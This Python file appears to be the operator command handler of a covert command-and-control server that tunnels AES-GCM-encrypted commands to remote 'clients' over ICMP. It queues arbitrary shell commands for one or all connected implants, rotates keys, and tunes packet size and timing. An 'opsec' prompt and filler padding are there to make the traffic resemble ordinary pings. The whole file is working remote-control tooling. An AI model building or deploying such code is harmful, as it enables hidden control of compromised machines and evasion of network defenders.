from helpers import *


class CommandHandler:
    def __init__(self, client_manager):
        self._commands = ["help", "clients", "use ", "cmd ", "info", "blocksize ", "timeout ", "delay ", "updateAES"]
        self._client_manager = client_manager

    def handle_command(self, cmd):

        if cmd == "":
            pass
        elif cmd.lower() == "clients":
            self._client_manager.print_clients()
        elif cmd.lower() == "help":
            self.print_help()
        elif cmd.lower() == "info":
            self.cmd_info()
        elif cmd.lower().startswith("cmd "):
            self.run_cmd(cmd)
        elif cmd.lower().startswith("blocksize "):
            self.cmd_blocksize(cmd)
        elif cmd.lower().startswith("use "):
            self.cmd_use(cmd)
        elif cmd.lower().split()[0] in ["timeout", "delay", "updateaes"]:
            self.cmd_config(cmd)


    def get_commands(self):
        return self._commands

    def check(self, cmd):
        if self._client_manager.get_clients():
            for client in self._client_manager.get_clients():
                if client.get_id() == self._client_manager.get_client_active():
                    cmd()
                else:
                    print("No active client. Activate by using 'use <IP>'")

        else:
            print("No clients connected :/")

    def cmd_info(self):
        if self._client_manager.get_clients():
            for client in self._client_manager.get_clients():
                if client.get_id() == self._client_manager.get_client_active():
                    client.print_attributes()
                else:
                    print("No active client. Activate by using 'use <IP>'")

        else:
            print("No clients connected :/")

    def run_cmd(self, cmd):
        if self._client_manager.get_clients():
            if self._client_manager.get_client_active():
                client = self._client_manager.get_client(self._client_manager.get_client_active())
                if cmd.split()[1] == "clear":
                    client.set_server_command("")
                elif cmd.split()[1] == "cancel":
                    print_formatted_text(FormattedText([
                        ('class:bright', '[INFO] '),
                        ('class:bright', f'Canceling execution of command: {client.get_server_command()[:15]}')
                    ]), style=style)
                    client.cleanup()
                    client.set_server_command(cmd.split()[1])
                else:
                    client.set_server_command(' '.join(cmd.split()[1:]))
                self._client_manager.print_clients()
            else:
                if cmd.split()[1] == "all":
                    self._client_manager.cmd_all_clients(' '.join(cmd.split()[2:]))
                    self._client_manager.print_clients()
                else:
                    print("No active client. Activate by using 'use <IP>'")

        else:
            print("No clients connected :/")


    def print_help(self):
        print("Commands:"
              "\n- clients\t\tShow connected clients"
              "\n\n- use <IP>\t\tSelect a client (unselect: `use none`)"
              "\n\n- cmd <cmd>\t\tRun a command on the selected client (e.g. 'cmd whoami')"
              "\n- cmd all <cmd>\t\tRun a command on all connected clients (requires no active client (`use none`))"
              "\n- cmd cancel\t\tCancel the running command"
              "\n- cmd clear\t\tClear the command variable"

              "\n\n- delay <seconds>\tChange the delay between each packet sent from client (default: 0.5 seconds). Careful not to ICMP-flood the server"
              "\n- timeout <seconds>\tChange the client's sleep time (default: 10 seconds). Careful not to ICMP-flood the server"
              "\n- updateAES\t\tClient regenerates AES key and nonce, and sends it back to the server"
              "\n- info\t\t\tShow metadata about the selected client"
              # "\n- block: <True/False>\tIf client sends response in blocks of bytes or not"
              "\n- blocksize <bytes>\tAllowed block size (in bytes) is from 1 up to and including 1472")



    def cmd_blocksize(self, cmd):
        if self._client_manager.get_clients():
            for client in self._client_manager.get_clients():
                if client.get_id() == self._client_manager.get_client_active():
                    if cmd.split()[1].isdigit():
                        """
                        ADVANCED MTU CONFIGURATION

                        # Standard MTU is 1500
                        # Default max data we can send in data payload header of an ICMP packet is therefore:
                        # 20 bytes (IP header) + 8 bytes (ICMP header) + 1472 bytes (data payload) = 1500 bytes
                        # Wireshark adds the Ethernet layer on top of this, which results in a size of 1514 bytes in total

                        # If bigger blocksize is needed, first check if Jumbo Packet can be enabled on the network adapter:
                            # Get-NetAdapterAdvancedProperty -RegistryKeyword "*JumboPacket"
                            # If the current network adapter is displayed here:
                                # Enable Jumbo Packet on CLIENT (require administrator privileges):
                                    # Set-NetAdapterAdvancedProperty -Name "<network adapter name>" -DisplayName "Jumbo Packet" -DisplayValue "Enabled (9014)"
                                    # This will increase the limit to 8972 bytes, inclusive.
                            # If not, you have to change the current network adapter somehow

                        # Then you can increase the MTU on the CLIENT:
                            # netsh interface ipv4 set subinterface "<network adapter name>" mtu=<value <= 9000> store=persistent

                        # Final step is to increase MTU on SERVER as well
                            # sudo ip link set dev <network adapter name> mtu 10000
                        """
                        if int(cmd.split()[1]) > 1472:
                            print_formatted_text(FormattedText([
                                ('class:bright', '[INFO] '),
                                ('class:bright',
                                 f'{cmd.split()[1]} bytes not allowed. Maximum size allowed is 1472 bytes')
                            ]), style=style)
                            continue
                        elif int(cmd.split()[1]) != 32:
                            confirmation = input(
                                f"Bad opsec to change blocksize to anything else than 32 bytes. Continue? (y/N)")
                            if confirmation.lower() == "y":
                                client.set_blocksize(int(cmd.split()[1]))
                                client.set_server_command(cmd)
                                self._client_manager.print_clients()
                            else:
                                pass
                        else:
                            client.set_blocksize(32)
                            client.set_server_command("blocksize 32")
                            self._client_manager.print_clients()
                else:
                    print("No active client. Activate by using 'use <IP>'")

        else:
            print("No clients connected :/")


    def cmd_use(self, cmd):
        if self._client_manager.get_clients():
            client = self._client_manager.get_client(cmd.split()[1])
            if self._client_manager.get_client_active() and cmd.split()[1].lower() == "none":
                self._client_manager.clear_client_active()
                return

            elif client in self._client_manager.get_clients():
                self._client_manager.set_client_active(client)
                self._client_manager.print_clients()
            else:
                print(f"'{cmd.split()[1]}' is not a connected client")

        else:
            print("No clients connected :/")

    def cmd_config(self, cmd):
        if self._client_manager.get_clients():
            if self._client_manager.get_client_active():
                client = self._client_manager.get_client(self._client_manager.get_client_active())
                client.set_server_command(cmd)
                self._client_manager.print_clients()
            else:
                print("No active client. Activate by using 'use <IP>'")
        else:
            print("No clients connected :/")




    def read_cmd(self, ip_adr):
        for client in self._client_manager.get_clients():
            if client.get_id() == ip_adr:
                cmd = client.get_server_command()

                if cmd == "updateAES":
                    client.setUpdateAES(True)
                client.set_server_command("")
                if len(cmd) > 1:
                    # hacky solution so that it doesn't clean up the first part of "OK: Cancel"
                    if cmd.lower() == "cancel" and len(client.get_encrypted_hex_block()) >= 32:
                        client.cleanup()
                    elif cmd.lower() == "init ok":
                        client.set_server_command("")
                    try:
                        client.set_executed_command(cmd)
                        return encrypt_msg_gcm(client.get_aes_key(), client.get_aes_nonce(), cmd)
                    except Exception as error:
                        print("(read_cmd) An error occurred:", error)
                else:
                    return "abcdefghijklmnopqrstuvwabcdefghi"